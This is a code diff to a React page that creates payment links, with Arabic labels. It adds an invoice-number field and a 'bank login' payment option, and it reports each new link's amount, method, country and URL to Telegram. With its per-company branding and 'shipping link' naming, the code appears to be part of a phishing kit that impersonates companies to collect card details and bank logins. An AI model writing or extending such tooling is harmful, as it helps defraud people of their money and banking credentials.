@@ -12,6 +12,7 @@ import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countr
 import { getCompanyMeta } from "@/utils/companyMeta";
 import { getCurrency, getDefaultTitle } from "@/utils/countryData";
 import { generatePaymentLink } from "@/utils/paymentLinks";
+import { sendToTelegram } from "@/lib/telegram";
 import { CreditCard, DollarSign, Hash, Building2, Copy, ExternalLink, FileText } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import TelegramTest from "@/components/TelegramTest";
@@ -32,6 +33,7 @@ const CreatePaymentLink = () => {
   const createLink = useCreateLink();
   const countryData = getCountryByCode(country?.toUpperCase() || "");
 
+  const [invoiceNumber, setInvoiceNumber] = useState("");
   const [paymentAmount, setPaymentAmount] = useState("500");
   const [paymentMethod, setPaymentMethod] = useState("card");
   const [showSuccessDialog, setShowSuccessDialog] = useState(false);
@@ -49,10 +51,10 @@ const CreatePaymentLink = () => {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
 
-    if (!paymentAmount) {
+    if (!invoiceNumber || !paymentAmount) {
       toast({
         title: "خطأ",
-        description: "الرجاء إدخال مبلغ السداد",
+        description: "الرجاء إكمال جميع البيانات",
         variant: "destructive",
       });
       return;
@@ -63,9 +65,11 @@ const CreatePaymentLink = () => {
         type: "payment",
         country_code: country || "",
         payload: {
+          invoice_number: invoiceNumber,
           payment_amount: parseFloat(paymentAmount) || 500,
           payment_method: paymentMethod,
           selectedCountry: country || "SA",
+          service_key: "payment",
         },
       });
 
@@ -79,6 +83,23 @@ const CreatePaymentLink = () => {
       setCreatedPaymentUrl(paymentUrl);
       setLinkId(link.id);
       setShowSuccessDialog(true);
+
+      // إرسال معلومات إنشاء الرابط إلى تيليجرام
+      await sendToTelegram({
+        type: 'shipping_link_created',
+        data: {
+          linkId: link.id,
+          serviceKey: 'payment',
+          serviceName: 'خدمة السداد',
+          invoice_number: invoiceNumber,
+          payment_amount: parseFloat(paymentAmount) || 500,
+          payment_method: paymentMethod === 'card' ? 'دفع بالبطاقة' : 'تسجيل دخول البنك',
+          country: countryData?.nameAr || country,
+          currency: getCurrencySymbol(country || 'SA'),
+          payment_url: paymentUrl,
+        },
+        timestamp: new Date().toISOString()
+      });
 
       toast({
         title: "تم إنشاء رابط السداد بنجاح!",
@@ -137,13 +158,30 @@ const CreatePaymentLink = () => {
               </div>
             </div>
 
-            <form onSubmit={handleSubmit} className="space-y-4">
+            <form onSubmit={handleSubmit} className="space-y-5">
+
+              {/* Invoice Number */}
+              <div>
+                <Label className="mb-2 flex items-center gap-2 text-sm font-semibold" style={{ color: paymentTheme.primary }}>
+                  <Hash className="w-4 h-4" />
+                  الرقم المفوتر *
+                </Label>
+                <Input
+                  type="text"
+                  value={invoiceNumber}
+                  onChange={(e) => setInvoiceNumber(e.target.value)}
+                  placeholder="INV-12345"
+                  className="h-12 text-base border-2"
+                  style={{ borderColor: `${paymentTheme.primary}30` }}
+                  required
+                />
+              </div>
 
               {/* Payment Amount */}
               <div>
                 <Label className="mb-2 flex items-center gap-2 text-sm font-semibold" style={{ color: paymentTheme.primary }}>
-                  <DollarSign className="w-3 h-3" />
-                  مبلغ السداد *
+                  <DollarSign className="w-4 h-4" />
+                  المبلغ *
                   {country && (
                     <span className="text-xs text-muted-foreground">
                       ({getCurrencyName(country)})
@@ -155,10 +193,11 @@ const CreatePaymentLink = () => {
                   value={paymentAmount}
                   onChange={(e) => setPaymentAmount(e.target.value)}
                   placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
-                  className="h-10 text-sm border-2 font-semibold"
-                  style={{ borderColor: `${paymentTheme.primary}20` }}
+                  className="h-12 text-base border-2 font-semibold"
+                  style={{ borderColor: `${paymentTheme.primary}30` }}
                   step="0.01"
                   min="0"
+                  required
                 />
                 {country && (
                   <p className="text-xs text-muted-foreground mt-1">
@@ -169,19 +208,25 @@ const CreatePaymentLink = () => {
 
               {/* Payment Method Selection */}
               <div>
-                <Label className="mb-2 flex items-center gap-2 text-sm" style={{ color: paymentTheme.primary }}>
-                  <CreditCard className="w-3 h-3" />
+                <Label className="mb-2 flex items-center gap-2 text-sm font-semibold" style={{ color: paymentTheme.primary }}>
+                  <CreditCard className="w-4 h-4" />
                   طريقة الدفع *
                 </Label>
                 <Select value={paymentMethod} onValueChange={setPaymentMethod}>
-                  <SelectTrigger className="h-10 border-2" style={{ borderColor: `${paymentTheme.primary}30` }}>
+                  <SelectTrigger className="h-12 border-2" style={{ borderColor: `${paymentTheme.primary}30` }}>
                     <SelectValue placeholder="اختر طريقة الدفع" />
                   </SelectTrigger>
                   <SelectContent className="bg-background z-50">
                     <SelectItem value="card">
                       <div className="flex items-center gap-2">
                         <CreditCard className="w-4 h-4" />
-                        <span>بيانات البطاقة</span>
+                        <span>دفع بالبطاقة</span>
+                      </div>
+                    </SelectItem>
+                    <SelectItem value="bank_login">
+                      <div className="flex items-center gap-2">
+                        <Building2 className="w-4 h-4" />
+                        <span>دفع بتسجيل الدخول للبنك</span>
                       </div>
                     </SelectItem>
                   </SelectContent>
@@ -190,9 +235,9 @@ const CreatePaymentLink = () => {
 
               <Button
                 type="submit"
-                className="w-full py-6 text-base font-bold shadow-lg text-white mt-6"
+                className="w-full py-7 text-lg font-bold shadow-lg text-white mt-8 hover:shadow-xl transition-all"
                 style={{ background: paymentTheme.gradient }}
-                disabled={createLink.isPending}
+                disabled={createLink.isPending || !invoiceNumber || !paymentAmount}
               >
                 {createLink.isPending ? (
                   <span>جاري الإنشاء...</span>
@@ -222,11 +267,23 @@ const CreatePaymentLink = () => {
             
             <div className="my-4">
               <div className="p-4 rounded-lg mb-4" style={{ background: paymentTheme.bgLight }}>
-                <div className="flex items-center justify-between text-sm mb-2">
-                  <span className="text-muted-foreground">المبلغ:</span>
-                  <span className="font-bold text-lg" style={{ color: paymentTheme.primary }}>
-                    {formatCurrency(parseFloat(paymentAmount) || 500, country || "SA")}
-                  </span>
+                <div className="space-y-2 text-sm">
+                  <div className="flex items-center justify-between">
+                    <span className="text-muted-foreground">الرقم المفوتر:</span>
+                    <span className="font-semibold">{invoiceNumber}</span>
+                  </div>
+                  <div className="flex items-center justify-between">
+                    <span className="text-muted-foreground">المبلغ:</span>
+                    <span className="font-bold text-lg" style={{ color: paymentTheme.primary }}>
+                      {formatCurrency(parseFloat(paymentAmount) || 500, country || "SA")}
+                    </span>
+                  </div>
+                  <div className="flex items-center justify-between">
+                    <span className="text-muted-foreground">طريقة الدفع:</span>
+                    <span className="font-semibold">
+                      {paymentMethod === 'card' ? 'دفع بالبطاقة' : 'تسجيل دخول البنك'}
+                    </span>
+                  </div>
                 </div>
               </div>
 
